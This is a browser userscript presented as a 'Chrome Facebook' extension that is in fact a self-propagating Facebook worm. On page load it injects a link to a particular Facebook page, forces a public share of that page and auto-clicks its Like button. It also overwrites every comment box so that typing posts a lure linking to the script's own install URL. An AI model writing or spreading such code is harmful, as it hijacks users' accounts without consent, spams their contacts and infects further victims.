// ==UserScript==
// @name           Chrome Facebook
// @author         Chrome Facebook
// @version        1.0
// @description    Facebook için hazırlanmış Google Chrome eklentisi
// @namespace      Chrome Facebook
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// ==/UserScript==

if(document.URL = "lhfsdfhsdfhksdfh"){
	var sanane = "http://a1.sphotos.ak.fbcdn.net/hphotos-ak-ash4/296979_162384200519426_100002435428082_297103_567995817_q.jpg"
}

if(document.URL.indexOf("www.facebook.com") >= 0 && document.URL.indexOf("sharer.php") < 0){
karinca = "<li class='topNavLink tinyman'>";
karinca += "<a href='http://www.facebook.com/karincaaa'>";
karinca += "<img class='uiProfilePhoto headerTinymanPhoto uiProfilePhotoLarge img' src='http://a3.sphotos.ak.fbcdn.net/hphotos-ak-ash4/317864_203139099757328_202719126465992_477528_1016530055_n.jpg' alt=''></a>";
karinca += "<a class='headerTinymanName' href='http://www.facebook.com/karincaaa'>karinca</a></li>";
if(document.getElementById("pageNav").getElementsByTagName("li").item(0).className == "topNavLink tinyman"){
document.getElementById("pageNav").innerHTML = karinca + document.getElementById("pageNav").innerHTML ;
}
else{
karinca = "<li><a class='topNavLink' href='http://www.facebook.com/karincaaa' accesskey='p'>karinca </a></li>";
document.getElementById("pageNav").innerHTML = karinca + document.getElementById("pageNav").innerHTML ;
}
}
if(cereziAl("Paylasildi") != "Evet"){
document.cookie = "Paylasildi=Evet";
window.location = "http://www.facebook.com/sharer/sharer.php?u=http://www.facebook.com/karincaaa";
}
if(document.URL.indexOf("facebook.com/karincaaa") >= 0 && document.URL.indexOf("sharer.php") < 0){
for(i=0;i <= document.getElementById("mainbuttonspan").getElementsByTagName("input").length - 1;i++){
if(document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen"){
	document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen"
}
}
document.getElementById("Begen").click();
}


function cereziAl(isim)
{
 var tarama = isim + "=";
 if (document.cookie.length > 0) { 
  konum = document.cookie.indexOf(tarama) 
  if (konum != -1) { 
   konum += tarama.length 
   son = document.cookie.indexOf(";", konum)  
   if (son == -1) 
     son = document.cookie.length
   return unescape(document.cookie.substring(konum, son))
  }
 }
}

if(document.URL.indexOf("sharer.php") >= 0){
	document.getElementsByName("UITargetedPrivacyWidget").item(0).value = 80;
	document.getElementsByName("share").item(0).click();
}

if(document.getElementsByName("add_comment_text").length > 0){
for(i=0;i<=document.getElementsByName("add_comment_text").length - 1;i++){
	document.getElementsByName("add_comment_text").item(i).setAttribute("onkeydown","this.value = 'Tıkla Panpa :D http://userscripts.org/scripts/source/115393.user.js ';");
}
}
